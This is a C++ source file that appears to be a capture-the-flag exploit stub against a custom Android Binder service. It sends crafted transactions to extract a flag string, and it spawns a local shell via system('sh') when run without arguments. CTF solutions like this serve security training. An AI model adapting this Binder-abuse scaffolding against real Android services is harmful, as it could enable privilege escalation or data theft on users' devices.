#define ENABLE_STRING8_OBSOLETE_METHODS
#include <binder/IPCThreadState.h>
#include <binder/IServiceManager.h>
#include <binder/ProcessState.h>
#include <stdio.h>

using namespace android;

/*
 * Boilerplate to interact with a service, rewrite and to add your exploit
 * */

int main(int argc) {
  if (argc == 1) {
    system("sh");
  }
  setvbuf(stdout, 0, 2, 0);
  puts("hello");
  // system("sh");
  sp<IServiceManager> sm = defaultServiceManager();
  if (!sm) {
    printf("failed to get service manager!");
    return EXIT_FAILURE;
  }
  puts("got service manager");
  String16 name(String16("Service1"));
  sp<IBinder> service = sm->checkService(name);
  if (!service) {
    printf("failed to get service!");
    return EXIT_FAILURE;
  }
  puts("got service");
  String16 iname("I.am.the.manager");
  {
    uint32_t flags = 0;
    Parcel data1, reply1;
    data1.markForBinder(service);
    data1.writeInterfaceToken(iname);
    data1.writeString16(String16("test"));
    data1.writeString16(String16("test"));
    data1.writeInt32(0);
    status_t s = service->transact(0x69, data1, &reply1, flags);
    printf("transact 1 %d\n", s);
  }
  {
    uint32_t flags = 0;
    Parcel data1, reply1;
    data1.markForBinder(service);
    data1.writeInterfaceToken(iname);
    data1.writeString16(String16("test"));
    data1.writeString16(String16("test"));
    service->transact(0x70, data1, &reply1, flags);
    // read strong binder then transact with 0x1337 opcode
    sp<IBinder> flag;
    status_t s = reply1.readStrongBinder(&flag);
    printf("transact 2 %d\n", s);
    Parcel data2, reply2;
    String16 iname2 = flag->getInterfaceDescriptor();
    data2.markForBinder(flag);
    data2.writeInterfaceToken(iname2);
    flag->transact(0x1337, data2, &reply2, flags);
    // which gives string16 flag
    String16 flag_str;
    reply2.readString16(&flag_str);
    printf("flag: %s\n", String8(flag_str).string());
  }
  printf("finished transact");

  return 0;
}
